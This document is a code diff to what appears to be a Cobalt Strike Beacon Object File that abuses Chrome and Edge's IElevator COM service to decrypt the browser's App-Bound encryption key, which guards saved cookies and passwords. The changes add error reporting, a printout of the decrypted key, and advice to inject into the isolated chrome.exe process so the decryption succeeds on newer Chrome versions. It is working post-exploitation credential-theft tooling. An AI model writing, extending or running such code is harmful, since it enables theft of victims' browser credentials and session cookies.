@@ -302,19 +302,23 @@ VOID GetAppBoundKey(CHAR * key, CHAR * browser, const CLSID CLSID_Elevator, cons
     }
     IElevatorChrome* chromeElevator = NULL;
     IElevatorEdge* edgeElevator = NULL;
+    const char *selected_interface = "requested interface";
     // Create an instance of the IElevator COM object
     if (MSVCRT$strcmp(browser, "chrome") == 0){
         hr = OLE32$CoCreateInstance(&CLSID_Elevator, NULL, CLSCTX_LOCAL_SERVER, &IID_IElevator, (void**)&chromeElevator);
         if (FAILED(hr)){
             BeaconPrintf(CALLBACK_ERROR, "[*] CoCreateInstance with Chrome_IID_IElevator2 failed (0x%08X), trying Chrome_IID_IElevator...\n", hr);
             hr = OLE32$CoCreateInstance(&CLSID_Elevator, NULL, CLSCTX_LOCAL_SERVER, &Chrome_IID_IElevator, (void**)&chromeElevator);
+            selected_interface = "IElevatorChrome";
+        } else {
+            selected_interface = "IElevator2Chrome";
         }
     }
     if (MSVCRT$strcmp(browser, "msedge") == 0){
         hr = OLE32$CoCreateInstance(&CLSID_Elevator, NULL, CLSCTX_LOCAL_SERVER, &IID_IElevator, (void**)&edgeElevator);
     }
     if (FAILED(hr)) {
-        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to create IElevator instance.\n");
+        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to create IElevator instance. HRESULT: 0x%08lX\n", (unsigned long)hr);
         OLE32$CoUninitialize();
         return;
     }
@@ -345,7 +349,7 @@ VOID GetAppBoundKey(CHAR * key, CHAR * browser, const CLSID CLSID_Elevator, cons
     }
 
     if (FAILED(hr)) {
-        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to set proxy blanket.\n");
+        BeaconPrintf(CALLBACK_ERROR,"[!] Failed to set proxy blanket. HRESULT: 0x%08lX\n", (unsigned long)hr);
         OLE32$CoUninitialize();
         return;
     }
@@ -367,10 +371,23 @@ VOID GetAppBoundKey(CHAR * key, CHAR * browser, const CLSID CLSID_Elevator, cons
     //BeaconPrintf(CALLBACK_OUTPUT, "encrypted key length %d\n", encrypted_key_len);
 
     BSTR ciphertext_data = OLEAUT32$SysAllocStringByteLen((const char*)encrypted_key , encrypted_key_len );
+    if (!ciphertext_data) {
+        BeaconPrintf(CALLBACK_ERROR, "[!] SysAllocStringByteLen failed for %lu ciphertext bytes.\n", (unsigned long)encrypted_key_len);
+        MSVCRT$free(encrypted_key_with_header);
+        MSVCRT$free(encrypted_key);
+        if (chromeElevator) chromeElevator->lpVtbl->Release(chromeElevator);
+        if (edgeElevator) edgeElevator->lpVtbl->Release(edgeElevator);
+        OLE32$CoUninitialize();
+        return;
+    }
     
     //BeaconPrintf(CALLBACK_OUTPUT, "Base64 Decoded Encrypted Key: %s\n", BytesToHexString(ciphertext_data, encrypted_key_len));
     BSTR plaintext_data = NULL;
     DWORD last_error = ERROR_GEN_FAILURE;
+    BeaconPrintf(CALLBACK_OUTPUT,
+                 "[*] App-bound COM call: interface=%s ciphertext=%lu bytes bstr=%lu bytes\n",
+                 selected_interface, (unsigned long)encrypted_key_len,
+                 (unsigned long)OLEAUT32$SysStringByteLen(ciphertext_data));
     // call com to decrypt key
     if (MSVCRT$strcmp(browser, "chrome") == 0){
         hr = chromeElevator->lpVtbl->DecryptData(chromeElevator,ciphertext_data, &plaintext_data, &last_error);
@@ -383,12 +400,24 @@ VOID GetAppBoundKey(CHAR * key, CHAR * browser, const CLSID CLSID_Elevator, cons
         //BeaconPrintf(CALLBACK_OUTPUT, "Decryption succeeded.\n");
         DWORD decrypted_size = OLEAUT32$SysStringByteLen(plaintext_data);
         //BeaconPrintf(CALLBACK_OUTPUT, "Decrypted Data Size: %d\n", decrypted_size);
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] App-bound COM decryption succeeded: HRESULT=0x%08lX last_error=%lu plaintext=%lu bytes\n",
+                     (unsigned long)hr, (unsigned long)last_error,
+                     (unsigned long)decrypted_size);
         BeaconPrintf(CALLBACK_OUTPUT, "[!] Decrypted App Bound Key: %s\n",
                      BytesToHexString((const BYTE*)plaintext_data,
                                       decrypted_size));
 
     } else {
-        BeaconPrintf(CALLBACK_ERROR, "[!] App Bound Key Decryption failed. Last error: %lu\n If error 203, beacon is most likely not operating out of correct file path \n", last_error);
+        BeaconPrintf(CALLBACK_ERROR,
+                     "[!] App Bound Key Decryption failed: HRESULT=0x%08lX last_error=%lu plaintext=%p\n"
+                     "    Note: last_error is the COM service out-parameter and may be stale; HRESULT identifies the failing stage.\n",
+                     (unsigned long)hr, (unsigned long)last_error,
+                     plaintext_data);
+        if (hr == ELEVATOR_E_ISOLATION_STATE_INVALID) {
+            BeaconPrintf(CALLBACK_ERROR,
+                         "[!] Chrome isolation state mismatch. Chrome 157+ bound this key to an isolated caller.\n"
+                         "    Inject into the real chrome.exe process whose command line contains --isolated, not its non-isolated launcher/stub.\n");
+        }
     }
 
     OLEAUT32$SysFreeString(plaintext_data);
